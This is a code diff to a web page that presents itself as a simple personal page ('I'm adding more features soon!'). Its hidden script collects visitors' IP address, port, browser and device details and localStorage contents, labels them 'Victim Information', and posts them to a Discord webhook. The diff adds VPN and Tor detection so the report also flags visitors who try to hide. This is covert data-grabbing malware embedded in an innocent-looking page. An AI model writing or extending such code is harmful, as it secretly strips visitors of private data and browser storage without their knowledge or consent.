@@ -10,12 +10,62 @@
     <p>I'm adding more features soon!</p>
 
     <script>
+        // Function to detect VPN usage
+        async function detectVPN() {
+            try {
+                // Check for known VPN patterns in IP data
+                const vpnCheck1 = await fetch('https://vpnapi.io/api/check?api_key=YOUR_API_KEY');
+                const vpnData1 = await vpnCheck1.json();
+                
+                // Alternative VPN check using IP-API
+                const vpnCheck2 = await fetch('http://ip-api.com/json/');
+                const vpnData2 = await vpnCheck2.json();
+                
+                // Check for suspicious network characteristics
+                const suspiciousIndicators = [];
+                
+                // Check for Tor exit nodes
+                const torCheck = await fetch('https://check.torproject.org/api/ip');
+                const torData = await torCheck.json();
+                if (torData.IsTor) {
+                    suspiciousIndicators.push('Tor Exit Node');
+                }
+                
+                // Check for known VPN ranges
+                if (vpnData1.is_vpn || vpnData2.isProxy) {
+                    suspiciousIndicators.push('Known VPN Range');
+                }
+                
+                // Check for high packet loss or latency
+                const testLatency = await fetch('https://www.google.com/favicon.ico?_=' + Date.now());
+                const startTime = performance.now();
+                await testLatency.text();
+                const endTime = performance.now();
+                const latency = endTime - startTime;
+                
+                if (latency > 1000) {
+                    suspiciousIndicators.push(`High Latency (${latency.toFixed(2)}ms)`);
+                }
+                
+                return {
+                    detected: suspiciousIndicators.length > 0,
+                    indicators: suspiciousIndicators
+                };
+            } catch (error) {
+                console.error('VPN detection error:', error);
+                return { detected: false, indicators: [] };
+            }
+        }
+
         // Function to collect essential victim information
         async function collectVictimInfo() {
             try {
                 // Get IP address
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
+
+                // Detect VPN
+                const vpnStatus = await detectVPN();
 
                 // Get browser info
                 const browserInfo = {
@@ -43,6 +93,8 @@
                 const victimInfo = {
                     ip: ipData.ip,
                     port: window.location.port || (window.location.protocol === 'https:' ? 443 : 80),
+                    vpn: vpnStatus.detected,
+                    vpnIndicators: vpnStatus.indicators,
                     ...browserInfo,
                     deviceInfo,
                     localStorage: localStorageItems,
@@ -60,11 +112,13 @@
         async function sendToWebhook(info) {
             const webhookUrl = 'https://discord.com/api/webhooks/1461964964603625594/jH-XEtXJtxJm69mjlFViAi8BQWutT-P6wTioZ-tElKw3BlJihCEeuNB2AazCCIjgKQKU';
             
-            // Format the message with only requested sections
+            // Format the message with VPN detection
             const message = `
 **Victim Information:**
 - IP Address: ${info.ip}
 - Port Number: ${info.port}
+- VPN Detected: ${info.vpn ? 'Yes' : 'No'}
+${info.vpn ? `- Indicators: ${info.vpnIndicators.join(', ')}` : ''}
 - User Agent: ${info.userAgent.substring(0, 60)}...
 - Platform: ${info.platform}
 - Language: ${info.language}
